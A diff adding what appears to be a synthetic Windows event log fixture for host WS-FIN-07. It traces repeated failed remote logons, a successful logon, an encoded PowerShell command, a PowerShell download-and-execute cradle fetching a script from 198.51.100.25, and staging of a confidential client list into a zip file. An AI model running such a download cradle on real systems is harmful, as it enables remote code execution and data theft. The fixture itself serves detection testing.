@@ -1,0 +1,15 @@
+{"timestamp":"2026-07-15T09:00:11Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:00:48Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:01:22Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:02:05Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:02:44Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:03:18Z","event_id":4625,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"failure","logon_type":10}
+{"timestamp":"2026-07-15T09:04:02Z","event_id":4624,"channel":"Security","host":"WS-FIN-07","username":"j.smith","source_ip":"203.0.113.77","outcome":"success","logon_type":10}
+{"timestamp":"2026-07-15T09:04:51Z","event_id":1,"channel":"Microsoft-Windows-Sysmon/Operational","host":"WS-FIN-07","username":"j.smith","image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","parent_image":"C:\\Windows\\explorer.exe","command_line":"powershell.exe -NoProfile -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp","process_id":4820}
+{"timestamp":"2026-07-15T09:05:07Z","event_id":4104,"channel":"Microsoft-Windows-PowerShell/Operational","host":"WS-FIN-07","username":"j.smith","image":"powershell.exe","command_line":"IEX((New-Object Net.WebClient).DownloadString('https://198.51.100.25/update.ps1'))"}
+{"timestamp":"2026-07-15T09:05:19Z","event_id":3,"channel":"Microsoft-Windows-Sysmon/Operational","host":"WS-FIN-07","username":"j.smith","image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","source_ip":"10.20.30.47","destination_ip":"198.51.100.25","destination_port":443,"protocol":"tcp"}
+{"timestamp":"2026-07-15T09:06:42Z","event_id":4663,"channel":"Security","host":"WS-FIN-07","username":"j.smith","target_path":"C:\\Finance\\Confidential\\client_list_Q3.xlsx","action":"ReadData"}
+{"timestamp":"2026-07-15T09:07:10Z","event_id":11,"channel":"Microsoft-Windows-Sysmon/Operational","host":"WS-FIN-07","username":"j.smith","image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","target_path":"C:\\Users\\j.smith\\AppData\\Local\\Temp\\client_list_Q3.zip","action":"FileCreate"}
+{"timestamp":"2026-07-15T09:08:03Z","event_id":4688,"channel":"Security","host":"WS-FIN-07","username":"j.smith","image":"C:\\Windows\\System32\\notepad.exe","command_line":"notepad.exe C:\\Users\\j.smith\\notes.txt","outcome":"success"}
+{"timestamp":"2026-07-15T09:09:15Z","event_id":4624,"channel":"Security","host":"WS-HR-02","username":"m.jones","source_ip":"10.20.30.58","outcome":"success","logon_type":2}
+
